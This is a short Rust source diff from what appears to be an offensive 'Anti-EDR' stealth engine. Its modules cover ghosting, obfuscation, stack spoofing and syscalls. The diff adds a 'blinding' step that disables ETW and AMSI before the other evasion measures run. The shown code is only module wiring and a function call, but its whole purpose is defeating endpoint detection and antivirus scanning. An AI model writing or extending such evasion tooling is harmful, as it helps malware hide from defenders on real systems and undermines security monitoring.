@@ -16,12 +16,16 @@ pub mod ghosting;
 pub mod obfuscation;
 pub mod stack_spoof;
 pub mod syscalls;
+pub mod blinding;
 
 use log::{info, warn, error, debug};
 
 /// Initialize and apply Windows stealth measures
 pub fn check_and_apply_stealth() {
     info!("[AntiEDR] Phantom Mesh Anti-EDR Engine v2.0");
+
+    // 0. BLINDING (ETW + AMSI) - Do this FIRST
+    blinding::apply_all_blinding();
     
     // Check if already in ghost mode
     let is_ghost = std::env::args().any(|arg| arg == "--ghost");
